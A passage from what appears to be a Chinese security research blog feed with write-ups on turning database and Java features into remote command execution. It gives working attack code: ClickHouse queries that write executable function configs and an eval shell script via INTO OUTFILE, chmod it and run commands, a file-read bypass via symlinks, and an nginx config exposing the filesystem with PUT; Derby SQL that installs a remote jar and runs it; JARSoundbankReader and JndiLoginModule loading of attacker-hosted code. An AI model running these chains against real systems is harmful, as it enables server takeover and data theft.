class="hljs-name">name</span>&gt;</span>str<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span>raw<span class="hljs-tag">&lt;/<span class="hljs-name">format</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span>test_shell.sh<span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">lifetime</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">lifetime</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">function</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">functions</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="image-20250205023835769.png" alt="image-20250205023835769"></p><p><img src="image-20250205030619239.png" alt="image-20250205030619239"></p><p><img src="image-20250205030722732.png" alt="image-20250205030722732"></p><p>反弹shell也是没毛病的。</p><h3 id="0x03-executable"><a href="#0x03-executable" class="headerlink" title="0x03 executable"></a>0x03 executable</h3><p><code>executable</code> 表函数根据您在脚本中定义的用户自定义函数（UDF）的输出创建一个表。该可执行脚本存储在 <code>users_scripts</code> 目录中，可以从任何来源读取数据。</p><p><code>executable</code> 表函数需要三个参数，并接受一个可选的输入查询列表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">executable(script_name, format, structure, [input_query...] [,SETTINGS ...])<br></code></pre></td></tr></table></figure><ul><li><code>script_name</code> ：脚本的文件名。保存在 <code>user_scripts</code> 文件夹中（ <code>user_scripts_path</code> 设置的默认文件夹）</li><li><code>format</code> : 生成的表格格式</li><li><code>structure</code> : 生成的表的表结构</li><li><code>input_query</code> ：一个可选的查询（或集合或查询），其结果通过 stdin 传递给脚本</li></ul><p><a href="https://clickhouse.com/docs/en/engines/table-functions/executable">https://clickhouse.com/docs/en/engines/table-functions/executable</a></p><p>然后这个函数就很有意思，它会直接调用users_scripts，也就是我们可以不用配置xml直接去调用了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SELECT * FROM executable(&#x27;test_shell.sh&#x27;, Raw, &#x27;res String&#x27;, (select &#x27;echo hack by webchains-unam4&#x27;))<br></code></pre></td></tr></table></figure><p><img src="image-20250205031355312.png" alt="image-20250205031355312"></p><h3 id="0x04-Executable"><a href="#0x04-Executable" class="headerlink" title="0x04 Executable"></a>0x04 Executable</h3><p><a href="https://clickhouse.com/docs/en/engines/table-engines/special/executable">https://clickhouse.com/docs/en/engines/table-engines/special/executable</a></p><p><code>Executable</code> 和 <code>ExecutablePool</code> 表引擎允许您定义一个表，其行由您定义的脚本生成（通过将行写入 stdout）。可执行脚本存储在 <code>users_scripts</code> 目录中，可以从任何来源读取数据。</p><ul><li><code>Executable</code> 表格：脚本在每次查询时运行</li><li><code>ExecutablePool</code> 表格：维护一个持久进程池，并从池中获取进程进行读取</li></ul><p>您可以可选地包含一个或多个输入查询，将它们的输出流到 stdin，以便脚本读取。</p><p>和0x03 executable 不同。这个Executable 是用来定义表引擎。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">CREATE TABLE shell_table (res String) ENGINE = Executable(&#x27;test_shell.sh&#x27;, TabSeparated,  (select &#x27;echo hack by webchains-unam4&#x27;))<br><br>select * from shell_table<br></code></pre></td></tr></table></figure><p><img src="image-20250205032148543.png" alt="image-20250205032148543"></p><h3 id="0x05-INTO-OUTFILE-（输出的文件是到客户端）"><a href="#0x05-INTO-OUTFILE-（输出的文件是到客户端）" class="headerlink" title="0x05 INTO OUTFILE （输出的文件是到客户端）"></a>0x05 INTO OUTFILE （输出的文件是到客户端）</h3><p>我门肯定是希望结局sql语句来完成 命令执行的，所以我们可以借助INTO OUTFILE  来创建 xml 以及 sh or python 脚本。所以这只能本地命令执行 有点鸡肋。</p><p><a href="https://clickhouse.com/docs/en/sql-reference/statements/select/into-outfile">https://clickhouse.com/docs/en/sql-reference/statements/select/into-outfile</a></p><p><code>INTO OUTFILE</code> 子句将 <code>SELECT</code> 查询的结果重定向到客户端的一个文件中。</p><p>压缩文件受支持。压缩类型通过文件名扩展名检测（默认使用模式 <code>&#39;auto&#39;</code> ）。或者可以在 <code>COMPRESSION</code> 子句中显式指定。可以在 <code>LEVEL</code> 子句中指定特定压缩类型的压缩级别。</p><p><strong>语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">&lt;</span>expr_list<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">INTO</span> OUTFILE file_name [<span class="hljs-keyword">AND</span> STDOUT] [APPEND <span class="hljs-operator">|</span> <span class="hljs-keyword">TRUNCATE</span>] [COMPRESSION type [LEVEL level]]<br></code></pre></td></tr></table></figure><p><code>file_name</code> 和 <code>type</code> 是字符串字面量。支持的压缩类型有： <code>&#39;none&#39;</code> ， <code>&#39;gzip&#39;</code> ， <code>&#39;deflate&#39;</code> ， <code>&#39;br&#39;</code> ， <code>&#39;xz&#39;</code> ， <code>&#39;zstd&#39;</code> ， <code>&#39;lz4&#39;</code> ， <code>&#39;bz2&#39;</code> 。</p><p><code>level</code> 是一个数值字面量。支持的后续范围的正整数包括： <code>1-12</code> 用于 <code>lz4</code> 类型， <code>1-22</code> 用于 <code>zstd</code> 类型，以及 <code>1-9</code> 用于其他压缩类型。</p><p>Poc.xml</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">select &#x27;&lt;functions&gt;<br>    &lt;function&gt;<br>        &lt;type&gt;executable&lt;/type&gt;<br>        &lt;name&gt;shell&lt;/name&gt;<br>        &lt;return_type&gt;String&lt;/return_type&gt;<br>        &lt;format&gt;raw&lt;/format&gt;<br>        &lt;command&gt;id&lt;/command&gt;<br>        &lt;execute_direct&gt;0&lt;/execute_direct&gt;<br>      &lt;lifetime&gt;1&lt;/lifetime&gt;<br>    &lt;/function&gt;<br>&lt;/functions&gt;&#x27; into outfile &#x27;/etc/clickhouse-server/shell_function.xml&#x27; TRUNCATE format raw<br></code></pre></td></tr></table></figure><p>可以看到写入后正常执行。</p><p><img src="image-20250205033426447.png" alt="image-20250205033426447"></p><p>来写脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">select &#x27;&lt;functions&gt;<br>    &lt;function&gt;<br>        &lt;type&gt;executable&lt;/type&gt;<br>        &lt;name&gt;test_shell&lt;/name&gt;<br>        &lt;return_type&gt;String&lt;/return_type&gt;<br>        &lt;argument&gt;<br>            &lt;type&gt;String&lt;/type&gt;<br>            &lt;name&gt;str&lt;/name&gt;<br>        &lt;/argument&gt;<br>        &lt;format&gt;raw&lt;/format&gt;<br>        &lt;command&gt;test_shell.sh&lt;/command&gt;<br>        &lt;lifetime&gt;1&lt;/lifetime&gt;<br>    &lt;/function&gt;<br>&lt;/functions&gt;&#x27; into outfile &#x27;/etc/clickhouse-server/shell2_function.xml&#x27; TRUNCATE format raw<br><br><br>select &#x27;#!/bin/bash<br>while read read_data;<br>    do eval &quot; $read_data &quot;;<br>done&#x27; into outfile &#x27;/var/lib/clickhouse/user_scripts/test_shell.sh&#x27; TRUNCATE format raw<br></code></pre></td></tr></table></figure><p><img src="image-20250205033851568.png" alt="image-20250205033851568"></p><p>这个时候执行的时候会提示没有权限，答案是写入的test_shell.sh没有执行权限。</p><p>所以在套娃一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">select &#x27;&lt;functions&gt;<br>    &lt;function&gt;<br>        &lt;type&gt;executable&lt;/type&gt;<br>        &lt;name&gt;shell&lt;/name&gt;<br>        &lt;return_type&gt;String&lt;/return_type&gt;<br>        &lt;format&gt;raw&lt;/format&gt;<br>        &lt;command&gt;chmod +x /var/lib/clickhouse/user_scripts/test_shell.sh&lt;/command&gt;<br>        &lt;execute_direct&gt;0&lt;/execute_direct&gt;<br>        &lt;lifetime&gt;1&lt;/lifetime&gt;<br>    &lt;/function&gt;<br>&lt;/functions&gt;&#x27; into outfile &#x27;/etc/clickhouse-server/shell_function.xml&#x27; TRUNCATE format raw<br></code></pre></td></tr></table></figure><p><img src="image-20250205034409341.png" alt="image-20250205034409341"></p><p>然后就有执行权限了</p><h3 id="0x06-encode"><a href="#0x06-encode" class="headerlink" title="0x06 encode"></a>0x06 encode</h3><p>有些情况下，我们输入的脚本过于复杂，就可以使用编码解码来进行写入</p><p><a href="https://clickhouse.com/docs/en/sql-reference/functions/string-functions#punycodedecode">https://clickhouse.com/docs/en/sql-reference/functions/string-functions#punycodedecode</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/functions/string-functions#base64encode">https://clickhouse.com/docs/en/sql-reference/functions/string-functions#base64encode</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/functions/hash-functions#sqidencode">https://clickhouse.com/docs/en/sql-reference/functions/hash-functions#sqidencode</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/functions/encoding-functions">https://clickhouse.com/docs/en/sql-reference/functions/encoding-functions</a></p><p>编码，解码的方式很多，base64，hex ，binary 等常见都可以</p><p>这里直接使用binary编码后在解码写入公钥。</p><p><img src="image-20250205035600165.png" alt="image-20250205035600165"></p><p><img src="image-20250205035714142.png" alt="image-20250205035714142"></p><p>也可以使用hex编码，char</p><p><img src="image-20250205040030535.png" alt="image-20250205040030535"></p><p>不用想，以后拿来绕waf极好的</p><h3 id="0x07-file-文件读取"><a href="#0x07-file-文件读取" class="headerlink" title="0x07 file 文件读取"></a>0x07 file 文件读取</h3><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/file">https://clickhouse.com/docs/en/sql-reference/table-functions/file</a></p><p>一个提供类似 SELECT 和 INSERT 操作文件接口的表格引擎，类似于 s3 表格功能。使用 <code>file()</code> 处理本地文件，使用 <code>s3()</code> 处理对象存储中的存储桶，如 S3、GCS 或 MinIO。</p><p><code>file</code> 函数可用于 <code>SELECT</code> 和 <code>INSERT</code> 查询中读取或写入文件。</p><p>file接口可以直接读取文件。</p><p><img src="image-20250205040615849.png" alt="image-20250205040615849"></p><p>但是在只能读&#x2F;user_files下的文件。</p><p>所以有什么绕过了</p><p>在低版本下可以直接使用..&#x2F;..&#x2F;进行读取 （枇杷哥）</p><p><img src="image-20250205040720182.png" alt="image-20250205040720182"></p><p>那新版本可以绕过吗？ 有的，我们只需要ln -s 软连接目录到user_files即可。</p><p><img src="image-20250205040928229.png" alt="image-20250205040928229"></p><p><img src="image-20250205040936100.png" alt="image-20250205040936100"></p><p>以及可以用file来猜文件</p><p><img src="image-20250207235043559.png" alt="image-20250207235043559"></p><p>nginx猜到就可想办法写&#x2F;上次配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">user  root;<br>worker_processes 4;<br>pid /tmp/nginx.pid;<br><br>events &#123;<br>    worker_connections 768;<br>&#125;<br><br>http &#123;<br>    server &#123;<br>        listen 1337;<br>        root /;<br>        autoindex on;<br>    <br>        location / &#123;<br>            dav_methods PUT;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接把&#x2F;映射出来，开启put协议。</p><h3 id="0x08-more-思考"><a href="#0x08-more-思考" class="headerlink" title="0x08 more 思考"></a>0x08 more 思考</h3><p>​还有许多有意思的函数，比如 url函数，可以去网络上的文件，mysql、postgresql、redis、sqlite、mongodb等他可以直接连接数据库查询，也就是可以利用clickhouse进行内网数据库横向等。</p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/hdfs">https://clickhouse.com/docs/en/sql-reference/table-functions/hdfs</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/jdbc">https://clickhouse.com/docs/en/sql-reference/table-functions/jdbc</a></p><p>开启 clickhouse-jdbc-bridge，还是直接进行jdbc连接。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> jdbc(<span class="hljs-string">&#x27;jdbc:mysql://localhost:3306/?user=root&amp;password=root&#x27;</span>, <span class="hljs-string">&#x27;schema&#x27;</span>, <span class="hljs-string">&#x27;table&#x27;</span>)<br></code></pre></td></tr></table></figure><p>那么是不是就可以直接攻击mysql，postgresql，h2等java jdbc攻击</p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/s3">https://clickhouse.com/docs/en/sql-reference/table-functions/s3</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/hudi">https://clickhouse.com/docs/en/sql-reference/table-functions/hudi</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/gcs">https://clickhouse.com/docs/en/sql-reference/table-functions/gcs</a></p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/azureBlobStorage">https://clickhouse.com/docs/en/sql-reference/table-functions/azureBlobStorage</a></p><p>以及它还可以从Storage获取数据，也就是查询的记录都会在log，也就是可以在log进行正则匹配找ak，sk。</p><p>以及在java中，做反序列化gadget的可能性，driud，c3p0，Hibernate ，hikari，dbcp等可以在jdbc连接时执行sql的gagdegt，我想大概可以的。</p><h3 id="致谢以引用"><a href="#致谢以引用" class="headerlink" title="致谢以引用"></a>致谢以引用</h3><p><a href="https://github.com/Java-Chains">https://github.com/Java-Chains</a></p><p><a href="https://clickhouse.com/docs">https://clickhouse.com/docs</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[复现]derby数据库调用java|spi加载jar包|JndiLoginModule</title>
    <link href="/2025/01/03/%E5%A4%8D%E7%8E%B0-derby%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B0%83%E7%94%A8java/"/>
    <url>/2025/01/03/%E5%A4%8D%E7%8E%B0-derby%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B0%83%E7%94%A8java/</url>
    
    <content type="html"><![CDATA[<h3 id="BB"><a href="#BB" class="headerlink" title="BB"></a>BB</h3><p>  学学大哥的文章，复现复现</p><h2 id="0x01-derby复现"><a href="#0x01-derby复现" class="headerlink" title="0x01 derby复现"></a>0x01 derby复现</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>准备一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testShell4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>sql 执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">## 导入一个类到数据库中<br>CALL SQLJ.INSTALL_JAR(<span class="hljs-string">&#x27;http://127.0.0.1:8088/test3.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.Sample4&#x27;</span>, <span class="hljs-number">0</span>)<br><br>## 将这个类加入到derby.database.classpath，这个属性是动态的，不需要重启数据库<br>CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(<span class="hljs-string">&#x27;derby.database.classpath&#x27;</span>,<span class="hljs-string">&#x27;APP.Sample4&#x27;</span>)<br><br>## 创建一个PROCEDURE，EXTERNAL NAME 后面的值可以调用类的<span class="hljs-keyword">static</span>类型方法<br>CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME <span class="hljs-string">&#x27;testShell4.exec&#x27;</span><br><br>## 调用PROCEDURE<br>CALL SALES.TOTAL_REVENUES()<br></code></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">calc</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            <span class="hljs-type">IOException</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var1;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">package</span> org.unam4;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">derbywithjar</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:derby:myDB;create=true&quot;</span>);<br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br>        statement.execute(<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://127.0.0.1:8088/exp.jar&#x27;, &#x27;APP.Sample4&#x27;, 0)&quot;</span>);<br>        statement.execute(<span class="hljs-string">&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;)&quot;</span>);<br>        statement.execute(<span class="hljs-string">&quot;CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;calc.calc&#x27;&quot;</span>);<br>        statement.execute(<span class="hljs-string">&quot;CALL SALES.TOTAL_REVENUES()&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br><br>jar cvf exp.jar calc.class<br></code></pre></td></tr></table></figure><p><img src="image-20250103160352022.png" alt="image-20250103160352022"></p><h2 id="0x02-spi-加载jar包"><a href="#0x02-spi-加载jar包" class="headerlink" title="0x02 spi 加载jar包"></a>0x02 spi 加载jar包</h2><p>com.sun.media.sound.JARSoundbankReader</p><p><img src="image-20250103161318735.png" alt="image-20250103161318735"></p><p>读取META-INF&#x2F;services&#x2F;javax.sound.midi.Soundbank文件的内容，然后调用urlclassloaer加载指定的类,需要注意先判断回传的流是不是zip，再就是加载的类要继承Soundbank接口。</p><p><img src="image-20250103165037005.png" alt="image-20250103165037005"></p><p>也可以本地加载。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.unam4.test;<br><br><br><span class="hljs-keyword">import</span> com.sun.media.sound.JARSoundbankReader;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> javax.sound.midi.Soundbank;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        ClassPool classPool = ClassPool.getDefault();</span><br><span class="hljs-comment">//        CtClass ctClass = classPool.makeClass(&quot;calc&quot;);</span><br><span class="hljs-comment">//        ctClass.setInterfaces(new CtClass[]&#123;classPool.get(Soundbank.class.getName())&#125;);</span><br><span class="hljs-comment">//        ctClass.makeClassInitializer().setBody(&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;);</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br>        <span class="hljs-type">JARSoundbankReader</span> <span class="hljs-variable">jarSoundbankReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JARSoundbankReader</span>();<br>        jarSoundbankReader.getSoundbank(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/exp.zip&quot;</span>));<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>先用javasist生成一个class，需要继承Soundbank，然后打包成zip,META-INF&#x2F;services&#x2F;javax.sound.midi.Soundbank 写入加载的类</p><p><img src="image-20250103164642813.png" alt="image-20250103164642813"></p><p><img src="image-20250103164829850.png" alt="image-20250103164829850"></p><p>运行加载成功</p><p><img src="image-20250103165519048.png" alt="image-20250103165519048"></p><p>也就是可以上传zip，然后加载。</p><h2 id="0x03-JndiLoginModule"><a href="#0x03-JndiLoginModule" class="headerlink" title="0x03 JndiLoginModule"></a>0x03 JndiLoginModule</h2><p>com.sun.security.auth.module.JndiLoginModule#login</p><p><img src="image-20250103170337582.png" alt="image-20250103170337582"></p><p><img src="image-20250103170345220.png" alt="image-20250103170345220"></p><p>构造一个JndiLoginModule类就行了</p><p><img src="image-20250103170447711.png" alt="image-20250103170447711"></p><p>自带构造函数，从map里获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JndiLoginModule</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiLoginModule</span>();<br>Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-keyword">module</span>.USER_PROVIDER, <span class="hljs-string">&quot;ldap://127.0.0.1:80/Object&quot;</span>);<br>map.put(<span class="hljs-keyword">module</span>.GROUP_PROVIDER, <span class="hljs-string">&quot;group&quot;</span>);<br><span class="hljs-type">JAASRealm</span> <span class="hljs-variable">realm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JAASRealm</span>();<br>realm.setContainer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardContext</span>());<br><span class="hljs-keyword">module</span>.initialize(<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">JAASCallbackHandler</span>(realm, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), <span class="hljs-literal">null</span>, map);<br><span class="hljs-keyword">module</span>.login();<br></code></pre></td></tr></table></figure><p><img src="image-20250103170652713.png" alt="image-20250103170652713"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce</a></p><p><a href="https://db.apache.org/derby/docs/10.4/getstart/index.html">https://db.apache.org/derby/docs/10.4/getstart/index.html</a></p><p><a href="https://ti.aliyun.com/#/log?id=28">https://ti.aliyun.com/#/log?id=28</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tomcat下上传xml进行利用学习</title>
    <link href="/2025/01/03/tomcat%E4%B8%8B%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/01/03/tomcat%E4%B8%8B%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01  分析"></a>0x01  分析</h3><p>org.apache.catalina.core.ContainerBase.ContainerBackgroundProcessor#run</p><p><img src="image-20250103104554976.png" alt="image-20250103104554976"></p><p>tomcat后台每10s触发一次。然后调用processChildren</p><p>org.apache.catalina.core.ContainerBase.ContainerBackgroundProcessor#processChildren</p><p><img src="image-20250103104819434.png" alt="image-20250103104819434"></p><p>然后在在container查找所有Container[]，遍历触发tomcat不同容器的backgroundProcess方法。。</p><p> 当遍历到StandardEngine[Catalina].StandardHost[localhost]<img src="image-20250103105507534.png" alt="image-20250103105507534"></p><p>org.apache.catalina.core.ContainerBase#backgroundProcess</p><p><img src="image-20250103105554945.png" alt="image-20250103105554945"></p><p><img src="image-20250103105801215.png" alt="image-20250103105801215"></p><p>org.apache.catalina.startup.HostConfig#lifecycleEvent</p><p><img src="image-20250103111331623.png" 